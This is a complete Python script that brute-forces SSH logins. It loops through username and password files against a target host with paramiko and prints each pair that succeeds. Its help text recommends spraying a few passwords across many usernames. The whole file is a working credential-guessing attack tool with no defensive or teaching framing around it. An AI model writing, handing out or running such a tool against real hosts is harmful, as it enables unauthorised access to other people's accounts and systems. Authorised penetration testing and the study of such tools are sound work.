#! /bin/python
import paramiko
import sys

FAILC = '\033[91m'
SUCCESSC = '\033[92m'
HELPC = '\033[96m'
ENDC = '\033[0m'


def help():
    print(
        HELPC + "\nPlease enter arguments in the order: " + ENDC + "\n> sshBruteForce.py [target] [path-to-usernames] [path-to-passwords]  " + HELPC + "\n \nThis script tests ssh connectivity with the given credentials in the given files. \nFor the greatest effect, a small number of passwords should be used with a large selection of users." + ENDC
    )
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

if(len(sys.argv) != 4):
    help()
    
else:
    target = sys.argv[1]
    passwords = open(sys.argv[3])
    
    for passw in passwords:
        passw = passw.strip()
        usernames = open(sys.argv[2])
        
        for user in usernames:
            user = user.strip()
            try:
                ssh.connect(target, username=user, password=passw)
                print(SUCCESSC + "success |  "  + user + ":" + passw + ENDC)
                ssh.close()
            except:
                print(FAILC + "failed  |  " + user + ":" + passw + ENDC)
